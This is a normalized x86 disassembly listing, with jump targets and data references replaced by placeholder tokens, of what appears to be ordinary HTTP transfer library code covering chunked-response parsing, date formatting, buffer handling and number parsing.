cmp edi esi
je r-xdata
cmp [ edi ] 0x3a
je r-xdata
test eax eax
jne r-xdata
mov edx [ __mb_cur_max@IAT ]
cmp [ edx ] 0x1
jle r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0x14 ] rw-data
mov eax [ ebx + 0x190 ]
mov [ esp + 0x20 ] eax
sub edi esi
mov [ esp + 0x4c ] edi
inc edi
push edi
call [ malloc@IAT ]
add esp 0x4
mov [ ebp + 0x164 ] eax
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
cmp edi 0x2
je r-xdata
mov [ esi + 0x18 ] rw-data
mov edx [ esp + 0x4c ]
mov edi eax
mov ecx edx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x164 ]
mov [ ecx + edx ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x38
retn
mov ecx [ ebp + 0x90 ]
mov eax [ ebp + 0x94 ]
mov edx ecx
or edx eax
je r-xdata
cmp edi 0x3
je r-xdata
mov al [ ebp + 0x10b ]
test al al
je r-xdata
xor edx edx
cmp eax edx
jg r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ ebx + 0x100 ]
mov [ esp + 0x3c ] rw-data
cmp eax 0x1
je r-xdata
cmp [ esp + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x90 ]
mov ecx [ ebp + 0x94 ]
or eax ecx
je r-xdata
jl r-xdata
mov edx [ ebx + 0xb4 ]
mov [ esp + 0x40 ] edx
call sub_40c590
test eax eax
mov [ esp + 0x4c ] eax
jne r-xdata
mov [ esp + 0x3c ] rw-data
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
xor edi edi
mov [ esp + 0x44 ] edi
mov [ ebp + 0x90 ] edx
mov [ ebp + 0x94 ] edx
cmp ecx edx
jae r-xdata
mov eax [ ebx + 0x1a0 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x38
retn
mov ecx [ ebp + 0x90 ]
mov edx [ ebp + 0x94 ]
mov eax ecx
or eax edx
je r-xdata
mov eax [ ebp + 0x154 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
lea eax [ ebx + 0x2c4 ]
push ecx
push esi
push 0x1
push eax
call [ ebx + 0x78 ]
mov edx [ esp + 0x54 ]
add esp 0x10
add edi eax
adc edx 0x0
cmp eax esi
mov [ esp + 0x44 ] edx
jne r-xdata
mov esi 0x4000
mov esi rw-data
mov [ esp + 0x24 ] esi
mov eax [ ebp + 0x158 ]
test eax eax
je r-xdata
mov edx [ ebx + 0x9c ]
mov eax [ ebx + 0x98 ]
mov ecx [ ebp + 0x88 ]
push edx
push eax
push ecx
push rw-data
call sub_40a280
add esp 0x10
mov eax [ ebx + 0x98 ]
add eax ecx
mov ecx [ ebx + 0x9c ]
adc ecx edx
push ecx
push eax
sub eax 0x1
sbb ecx 0x0
push ecx
mov ecx [ ebp + 0x88 ]
push eax
push ecx
push rw-data
call sub_40a280
add esp 0x18
jmp r-xdata
mov eax [ ebp + 0x88 ]
push eax
push rw-data
call sub_40a280
add esp 0x8
jmp r-xdata
push eax
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
pop ebp
mov eax 0x1a
pop ebx
add esp 0x38
retn
cmp edi [ ebp + 0x90 ]
jne r-xdata
mov [ esp + 0x28 ] esi
cmp [ eax ] 0x0
je r-xdata
mov [ esp + 0x24 ] eax
mov esi rw-data
jmp r-xdata
mov [ ebp + 0x154 ] eax
mov esi [ ebp + 0x90 ]
sub esi edi
cmp esi 0x4000
jbe r-xdata
cmp edx [ ebp + 0x94 ]
je r-xdata
mov eax [ ecx + 0x14 ]
test eax eax
mov [ esp + 0x30 ] eax
jne r-xdata
mov [ esp + 0x2c ] esi
mov eax [ ebp + 0x14c ]
test eax eax
mov [ esp + 0x28 ] eax
jne r-xdata
mov eax [ ebx + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x9c ]
mov ecx [ ebx + 0x98 ]
test eax eax
jl r-xdata
jmp r-xdata
mov eax [ ebp + 0x160 ]
test eax eax
mov [ esp + 0x34 ] eax
jne r-xdata
mov [ esp + 0x30 ] esi
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x18 ]
test eax eax
mov [ esp + 0x2c ] eax
jne r-xdata
jg r-xdata
mov eax [ ebp + 0x15c ]
test eax eax
mov [ esp + 0x38 ] eax
jne r-xdata
mov [ esp + 0x34 ] esi
mov esi [ ebp + 0x90 ]
mov edx [ ebp + 0x94 ]
sub ecx esi
sbb eax edx
mov [ ebx + 0x98 ] ecx
test eax eax
mov [ ebx + 0x9c ] eax
jg r-xdata
test ecx ecx
jbe r-xdata
mov eax [ ebx + 0x54 ]
test eax eax
je r-xdata
mov [ esp + 0x38 ] esi
jl r-xdata
mov edi esi
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x12
pop ebx
add esp 0x38
retn
mov eax [ ebx + 0x98 ]
test eax eax
ja r-xdata
mov edx esi
mov edx [ ebp + 0x154 ]
test edx edx
jne r-xdata
mov edi [ ebp + 0x148 ]
test edi edi
jne r-xdata
mov al [ ebp + 0x107 ]
test al al
je r-xdata
mov ecx esi
mov ecx [ ebp + 0x150 ]
test ecx ecx
jne r-xdata
mov al [ ebp + 0x10b ]
test al al
je r-xdata
mov eax esi
mov eax [ ebp + 0x144 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0xec ]
test eax eax
je r-xdata
mov esi [ esp + 0x1c ]
push esi
mov esi [ esp + 0x28 ]
push esi
mov esi [ esp + 0x30 ]
push esi
mov esi [ esp + 0x38 ]
push esi
mov esi [ esp + 0x40 ]
push esi
mov esi [ esp + 0x48 ]
push esi
mov esi [ esp + 0x50 ]
push esi
push edi
mov esi [ esp + 0x6c ]
push edx
mov edx [ esp + 0x38 ]
push ecx
mov ecx [ esp + 0x48 ]
push eax
mov eax [ esp + 0x68 ]
push eax
push ecx
push edx
push rw-data
push esi
call sub_40c6e0
add esp 0x40
test eax eax
jne r-xdata
mov esi [ esp + 0x40 ]
test esi esi
je r-xdata
lea eax [ ebx + 0xf0 ]
push eax
call [ gmtime@IAT ]
push eax
push rw-data
lea edi [ ebx + 0x2c4 ]
push 0x3fff
push edi
call [ strftime@IAT ]
mov eax [ ebx + 0xec ]
add esp 0x14
sub eax 0x2
je r-xdata
mov esi [ esp + 0x10 ]
push 0x0
push 0x0
push ebx
lea edi [ esi + 0x10 ]
mov [ esp + 0x2c ] edi
mov [ edi ] 0x0
call sub_40ace0
mov eax [ esp + 0x24 ]
add esp 0xc
sub eax 0x2
je r-xdata
mov ecx [ esi ]
push 0x3a
push ecx
call [ strchr@IAT ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push edi
push rw-data
dec eax
push edi
je r-xdata
mov esi [ ebx + 0x60 ]
mov eax [ ebx + 0x64 ]
mov edx esi
or edx eax
je r-xdata
dec eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov edi [ ebx + 0x5c ]
xor esi esi
cmp edi esi
je r-xdata
mov [ esp + 0x44 ] eax
jmp r-xdata
mov eax [ esi ]
lea edi [ esi + 0x30 ]
push eax
push edi
call sub_404c00
add esp 0x8
test eax eax
je r-xdata
dec eax
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov edx [ __mb_cur_max@IAT ]
cmp [ edx ] 0x1
jle r-xdata
push esi
call sub_40c6e0
add esp 0xc
mov [ esp + 0x44 ] esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x44 ] eax
mov esi ecx
jmp r-xdata
mov al [ ebp + 0x10e ]
test al al
jne r-xdata
mov [ ebp + 0x618 ] sub_404c20
mov [ ebp + 0x61c ] edi
mov [ esi + 0x78 ] 0x2
mov al [ ebp + 0x10e ]
test al al
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x22
pop ebx
add esp 0x38
retn
mov eax [ ebx + 0x9c ]
mov ecx [ ebx + 0x98 ]
test eax eax
jl r-xdata
mov eax [ esp + 0x4c ]
push 0x2
push rw-data
push eax
call sub_40c750
mov ecx [ esp + 0x58 ]
add ebx 0x8324
push ebx
push ebp
push ecx
call sub_40c5b0
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ esi ]
mov edx [ esp + 0x4c ]
push ecx
push rw-data
push edx
call sub_40c6e0
add esp 0xc
mov edx [ _pctype@IAT ]
movsx ecx al
mov eax [ edx ]
mov al [ eax + ecx * 2 ]
and eax 0x8
movsx eax al
push 0x8
push eax
call [ _isctype@IAT ]
add esp 0x8
jmp r-xdata
mov edi [ esp + 0x4c ]
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
mov eax [ esp + 0x4c ]
push ecx
push edx
push rw-data
push eax
call sub_40c6e0
add esp 0x10
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
jg r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
push rw-data
push edi
call sub_40c6e0
add esp 0x8
mov eax [ esp + 0x44 ]
mov edi [ esp + 0x4c ]
push eax
push esi
push rw-data
push edi
call sub_40c6e0
add esp 0x10
jmp r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x4c ]
push rw-data
push ecx
call sub_40c6e0
add esp 0x8
mov [ ebx + 0x180 ] 0x1
mov edi [ esp + 0x4c ]
mov edi [ esp + 0x4c ]
push rw-data
push edi
call sub_40c6e0
add esp 0x8
mov [ ebx + 0x180 ] 0x1
jmp r-xdata
mov dl [ ebp + 0x10e ]
test dl dl
jne r-xdata
test ecx ecx
jbe r-xdata
xor ecx ecx
neg eax
sbb eax eax
push ecx
neg eax
dec eax
add esi 0x20
push eax
push esi
jmp r-xdata
neg eax
sbb eax eax
lea ecx [ esi + 0x28 ]
neg eax
dec eax
push ecx
add esi 0x20
push eax
push esi
jmp r-xdata
mov edx [ esp + 0x4c ]
push 0x2
push rw-data
push edx
call sub_40c750
mov eax [ ebx + 0x9c ]
mov ecx [ ebx + 0x98 ]
push eax
push ecx
push ebx
call sub_40ace0
mov eax [ esp + 0x38 ]
add esp 0x18
mov [ eax ] eax
mov al [ ebx + 0x8309 ]
test al al
je r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esp + 0x4c ]
push 0x2
push rw-data
push esi
call sub_40c750
mov edi [ esp + 0x1c ]
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
push eax
push ecx
push ebx
call sub_40ace0
lea edx [ ebx + 0x8324 ]
push edx
push ebp
push esi
call sub_40c5b0
mov esi eax
add esp 0x24
test esi esi
jne r-xdata
lea edx [ esp + 0x3c ]
mov [ esp + 0x3c ] eax
push edx
push edi
call sub_404cd0
add esp 0x8
test eax eax
jne r-xdata
mov al [ ebx + 0x8309 ]
test al al
je r-xdata
push 0x2
push rw-data
push edi
call sub_40c750
mov eax [ ebx + 0x9c ]
mov ecx [ ebx + 0x98 ]
push eax
push ecx
push ebx
call sub_40ace0
lea edx [ ebx + 0x8324 ]
push edx
push ebp
push edi
call sub_40c5b0
add esp 0x24
test eax eax
jne r-xdata
mov edx [ esp + 0x4c ]
push eax
push ecx
push rw-data
push edx
call sub_40c6e0
add esp 0x10
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push ebp
call sub_408c60
add esp 0x20
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov eax [ esp + 0x20 ]
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] ecx
mov edx [ ebx + 0x5c ]
mov [ edi + 0x78 ] 0x2
mov [ eax ] edx
mov [ ebp + 0x618 ] sub_40c4b0
mov [ ebp + 0x61c ] ebp
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edx
push ebx
call sub_40ace0
mov al [ ebx + 0x8309 ]
add esp 0xc
test al al
jne r-xdata
mov eax [ esp + 0x44 ]
test eax eax
jg r-xdata
mov ecx [ edi ]
push ecx
call sub_404780
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
mov al [ ebx + 0x8309 ]
test al al
je r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x4c ]
push ecx
push eax
push edx
call sub_40c750
add esp 0xc
pop edi
pop esi
pop ebp
mov eax 0x22
pop ebx
add esp 0x38
retn
xor ecx ecx
lea ecx [ esi + 0x28 ]
jmp r-xdata
xor eax eax
xor ecx ecx
lea ecx [ edi + 0x28 ]
jmp r-xdata
mov ecx [ esp + 0x4c ]
push 0x2
push rw-data
push ecx
call sub_40c750
add esp 0xc
jmp r-xdata
push rw-data
push ebx
call sub_40c450
add esp 0x8
test eax eax
jne r-xdata
jl r-xdata
xor ecx ecx
lea ecx [ edi + 0x28 ]
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x38
retn
neg al
sbb eax eax
push ecx
neg eax
dec eax
add esi 0x20
push eax
push esi
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push ebp
call sub_408c60
add esp 0x20
test eax eax
je r-xdata
neg eax
sbb eax eax
push ecx
neg eax
dec eax
add edi 0x20
push eax
push edi
mov edx [ esp + 0x4c ]
add ebx 0x8324
push ebx
push ebp
push edx
call sub_40c5b0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x4c ]
push rw-data
push eax
call sub_40c6e0
add esp 0x8
mov [ ebx + 0x180 ] 0x1
push 0x2
push rw-data
push edi
call sub_40c750
mov al [ ebp + 0x10e ]
add esp 0xc
test al al
push esi
jne r-xdata
cmp esi 0x19000
jae r-xdata
neg al
sbb eax eax
push ecx
neg eax
dec eax
push eax
lea eax [ edi + 0x20 ]
push eax
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push ebp
call sub_408c60
mov esi eax
add esp 0x20
test esi esi
je r-xdata
mov edi [ esp + 0x50 ]
push rw-data
push edi
call sub_40c6e0
mov eax [ ebx + 0x5c ]
push esi
push eax
push edi
call sub_40c750
push 0x7
push rw-data
push edi
call sub_40c750
add esp 0x24
jmp r-xdata
mov ecx [ ebx + 0x5c ]
mov edx [ esp + 0x50 ]
push ecx
push edx
call sub_40c750
add esp 0xc
jmp r-xdata
mov edi [ esp + 0x10 ]
sub_40c450
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
mov esi [ eax + 0xb4 ]
dec ecx
test esi esi
mov edi ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov ecx [ esi ]
push edi
push ebx
push ecx
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_40c4b0
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
imul eax [ esp + 0x14 ]
mov edx [ ebp + 0x16c ]
xor ebx ebx
push esi
push edi
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edx + 0x78 ] 0x1
sete cl
mov [ ebp + 0x110 ] cl
mov ecx [ edx + 0xc ]
cmp ecx ebx
jg r-xdata
cmp [ edx + 0xc ] ebx
jne r-xdata
mov esi [ edx + 0x10 ]
mov edi [ esp + 0x14 ]
mov ecx eax
mov ebp ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ edx + 0x10 ]
mov esi [ edx + 0x8 ]
add edi eax
sub esi eax
mov [ edx + 0x8 ] esi
mov ecx [ edx + 0xc ]
mov [ edx + 0x10 ] edi
pop edi
sbb ecx ebx
pop esi
pop ebp
mov [ edx + 0xc ] ecx
pop ebx
retn
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ edx + 0x8 ]
mov esi [ edx + 0x10 ]
mov edi [ esp + 0x14 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx + 0x70 ]
mov esi [ edx + 0x74 ]
mov eax [ edx + 0x8 ]
mov edi ecx
or edi esi
je r-xdata
mov ecx [ edx + 0x8 ]
cmp ecx eax
ja r-xdata
pop edi
mov [ edx + 0x8 ] ebx
pop esi
mov [ edx + 0xc ] ebx
pop ebp
pop ebx
retn
mov edi [ edx + 0x68 ]
mov [ edx + 0x8 ] ecx
mov ecx [ edx + 0x60 ]
mov [ edx + 0x10 ] edi
mov [ edx + 0xc ] esi
mov [ ebp + 0x618 ] ecx
mov ecx [ edx + 0x64 ]
pop edi
mov [ ebp + 0x61c ] ecx
mov ecx [ edx + 0x78 ]
inc ecx
mov [ edx + 0x70 ] ebx
pop esi
mov [ edx + 0x74 ] ebx
pop ebp
mov [ edx + 0x78 ] ecx
pop ebx
retn
sub_40c590
push 0xc
call [ malloc@IAT ]
add esp 0x4
test eax eax
je r-xdata
xor eax eax
retn
mov edx eax
xor ecx ecx
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
retn
sub_40c5b0
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ esp + 0x18 ]
push edi
mov eax [ ebp + 0xbc ]
mov ebx [ ebp + 0x16c ]
mov edi [ esi + 0x8 ]
mov edx [ esi ]
mov [ esp + 0x10 ] eax
mov al [ ebp + 0x8 ]
test al 0x8
mov [ esp + 0x20 ] edi
je r-xdata
mov eax edi
cmp edi 0x4000
mov eax 0x4000
ja r-xdata
mov eax [ esi ]
mov edi [ free@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x14 ]
mov edx [ eax ]
add edx ecx
cmp ecx edi
mov [ eax ] edx
je r-xdata
mov edi [ ebp ]
mov ecx eax
mov esi edx
mov edx ecx
add edi 0x42c5
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp ]
mov edi [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
add edx 0x42c5
jmp r-xdata
mov eax edi
push esi
call edi
mov eax [ esp + 0x20 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push eax
call edi
add esp 0x4
mov [ ebx + 0x78 ] 0x2
mov eax [ esi ]
sub edi ecx
add eax ecx
mov ecx [ ebp + 0x618 ]
mov [ ebx + 0x60 ] ecx
mov edx [ ebp + 0x61c ]
mov ecx [ ebx + 0x10 ]
mov [ ebx + 0x64 ] edx
mov edx [ ebx + 0x8 ]
mov [ ebx + 0x68 ] ecx
mov ecx [ ebx + 0xc ]
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x74 ] ecx
mov [ ebp + 0x618 ] sub_40c4b0
mov [ ebp + 0x61c ] ebp
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x7c ] esi
pop edi
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0x78 ] 0x1
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
lea ecx [ esp + 0x14 ]
push ecx
push eax
push edx
mov edx [ esp + 0x1c ]
push edx
push ebp
call sub_4040d0
add esp 0x14
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
sub_40c6e0
mov ecx [ esp + 0x8 ]
push ebx
push ebp
lea eax [ esp + 0x14 ]
push esi
push eax
push ecx
call sub_40a390
mov ebx [ esp + 0x18 ]
mov ebp [ free@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
push ebx
call sub_40c750
push esi
mov edi eax
call ebp
add esp 0x10
test edi edi
pop edi
jne r-xdata
push ebx
call ebp
add esp 0x4
mov eax 0x1b
pop esi
pop ebp
pop ebx
retn
push eax
call ebp
add esp 0x4
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_40c750
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebx ]
push esi
test eax eax
je r-xdata
mov esi [ ebx + 0x8 ]
add esi ebp
shl esi 0x1
test eax eax
push esi
je r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
add ecx ebp
dec edx
cmp ecx edx
jbe r-xdata
call [ malloc@IAT ]
add esp 0x4
push eax
call [ realloc@IAT ]
add esp 0x8
jmp r-xdata
mov eax [ ebx ]
mov esi [ esp + 0x14 ]
push edi
mov edi [ ebx + 0x8 ]
mov ecx ebp
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x8 ] eax
pop ebp
xor eax eax
pop ebx
retn
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
pop esi
pop ebp
mov eax 0x1b
pop ebx
retn
test eax eax
jne r-xdata
sub_40c7f0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ ecx + 0x16c ]
push edi
add esi 0x38
mov [ eax ] 0x0
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esp + 0x18 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
dec eax
cmp eax 0x6
ja r-xdata
pop edi
pop esi
pop ebp
mov eax 0x5
pop ebx
retn
jmp [ eax * 4 + jump_table_40c9ac ]
mov ecx [ __mb_cur_max@IAT ]
cmp [ ecx ] 0x1
jle r-xdata
cmp [ ebx ] 0xd
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
mov edi [ esi + 0x1c ]
cmp edi ebp
jb r-xdata
cmp [ ebx ] 0xd
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
mov [ esi + 0x20 ] ebp
mov ecx [ _pctype@IAT ]
movsx eax [ ebx ]
mov edx [ ecx ]
mov al [ edx + eax * 2 ]
and eax 0x80
movsx edx [ ebx ]
push 0x80
push edx
call [ _isctype@IAT ]
add esp 0x8
jmp r-xdata
dec ebp
inc ebx
jmp r-xdata
mov [ esi + 0x18 ] 0x3
mov [ esi + 0x18 ] 0x3
jmp r-xdata
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
mov al [ ecx + 0x609 ]
test al al
jne r-xdata
mov edi ebp
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
retn
mov [ esi + 0x18 ] 0x6
jmp r-xdata
push ecx
call sub_40c7d0
add esp 0x4
test eax eax
je r-xdata
cmp eax 0x10
jge r-xdata
test eax eax
mov eax [ esi + 0x14 ]
je r-xdata
test ebp ebp
jne r-xdata
inc ebx
dec ebp
mov [ esi + 0x18 ] 0x4
jmp r-xdata
cmp ebp 0x1
mov [ esi + 0x18 ] 0x7
je r-xdata
mov eax [ esp + 0x20 ]
add ebx edi
sub ebp edi
mov ecx [ eax ]
add ecx edi
mov [ eax ] ecx
mov edx [ esi + 0x1c ]
sub edx edi
mov eax edx
mov [ esi + 0x1c ] edx
test eax eax
jne r-xdata
mov edx [ ecx ]
push edi
push ebx
push 0x1
push edx
call sub_404120
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
retn
push 0x10
push 0x0
push esi
mov [ eax + esi ] 0x0
call [ strtoul@IAT ]
add esp 0xc
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] 0x2
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov cl [ ebx ]
inc ebx
mov [ eax + esi ] cl
mov eax [ esi + 0x14 ]
dec ebp
inc eax
mov [ esi + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
jmp r-xdata
mov [ esi + 0x18 ] 0x5
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x4
pop ebx
retn
sub_40c9d0
sub esp 0xc
push ebp
push esi
mov esi [ esp + 0x18 ]
xor ebp ebp
push edi
mov edi [ _isctype@IAT ]
mov [ esp + 0xc ] ebp
mov [ esp + 0x1c ] esi
mov eax [ _pctype@IAT ]
movsx edx [ esi ]
mov ecx [ eax ]
mov al [ ecx + edx * 2 ]
and eax 0x8
movsx ecx [ esi ]
push 0x8
push ecx
call edi
add esp 0x8
jmp r-xdata
mov al [ esi ]
mov [ esp + 0x1c ] esi
cmp al 0x2d
jne r-xdata
inc esi
jmp r-xdata
cmp eax ebp
je r-xdata
cmp al 0x2b
je r-xdata
mov [ esp + 0xc ] 0x1
mov eax [ __mb_cur_max@IAT ]
cmp [ eax ] 0x1
jle r-xdata
inc esi
mov [ esp + 0x1c ] esi
test al al
jne r-xdata
cmp [ esp + 0x24 ] ebp
jne r-xdata
cmp [ esi + 0x1 ] 0x78
jne r-xdata
mov al [ esi ]
cmp al 0x30
jne r-xdata
mov eax [ esp + 0x20 ]
cmp eax ebp
je r-xdata
mov edx [ esp + 0x24 ]
mov al [ esi ]
push ebx
push edx
push eax
xor edi edi
call sub_40cb70
mov ebx eax
add esp 0x8
cmp ebx 0xffffffff
je r-xdata
mov [ esp + 0x24 ] 0xa
cmp al 0x30
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0x10
je r-xdata
pop edi
xor eax eax
pop esi
xor edx edx
pop ebp
add esp 0xc
retn
mov [ eax ] esi
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
cdq
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x24 ]
cmp eax 0x8
je r-xdata
add esi 0x2
mov [ esp + 0x24 ] 0x10
mov [ esp + 0x1c ] esi
jmp r-xdata
cmp eax ebp
jne r-xdata
mov eax [ esp + 0x24 ]
pop ebx
test eax eax
je r-xdata
neg ebp
adc edi 0x0
neg edi
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
jg r-xdata
inc esi
mov [ esp + 0x24 ] 0x8
mov [ esp + 0x1c ] esi
jmp r-xdata
cmp eax ebp
jne r-xdata
mov edx edi
pop edi
mov eax ebp
pop esi
pop ebp
add esp 0xc
retn
mov [ eax ] esi
or ebp 0xffffffff
mov edi 0x7fffffff
xor ebp ebp
mov edi 0x80000000
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edi ecx
mov ecx [ esp + 0x28 ]
inc eax
push ecx
mov ebp esi
mov dl [ eax ]
mov [ esp + 0x24 ] eax
push edx
call sub_40cb70
mov ebx eax
add esp 0x8
cmp ebx 0xffffffff
jne r-xdata
cmp esi ebp
jb r-xdata
call [ _errno@IAT ]
mov esi [ esp + 0x20 ]
mov [ eax ] 0x22
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push edi
push ebp
push ecx
push edx
call sub_40d460
mov esi eax
mov eax ebx
mov ecx edx
cdq
add esi eax
adc ecx edx
cmp ecx edi
jl r-xdata
mov esi [ esp + 0x20 ]
sub_40cb70
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x39
jg r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
cmp cl 0x41
jl r-xdata
movsx eax cl
sub eax 0x30
jmp r-xdata
cmp eax [ esp + 0x8 ]
jl r-xdata
cmp cl 0x61
jl r-xdata
movsx eax cl
sub eax 0x37
jmp r-xdata
retn
or eax 0xffffffff
movsx eax cl
sub eax 0x57
sub_40cbe0
push esi
push 0x10
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
push esi
call sub_40cbc0
add esp 0x8
mov eax esi
pop esi
retn
pop esi
retn
sub_40cc10
push 0xc
call [ malloc@IAT ]
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ eax ] ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov edx [ esp + 0x8 ]
push esi
mov esi [ edx + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] esi
mov esi [ edx + 0x8 ]
test esi esi
je r-xdata
mov [ ecx ] eax
mov [ eax + 0x4 ] 0x0
mov edx [ ecx ]
mov [ edx + 0x8 ] 0x0
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0xc ]
inc eax
mov [ ecx + 0xc ] eax
mov eax 0x1
retn
mov [ ecx + 0x4 ] eax
mov [ edx + 0x8 ] eax
mov eax [ ecx + 0xc ]
pop esi
inc eax
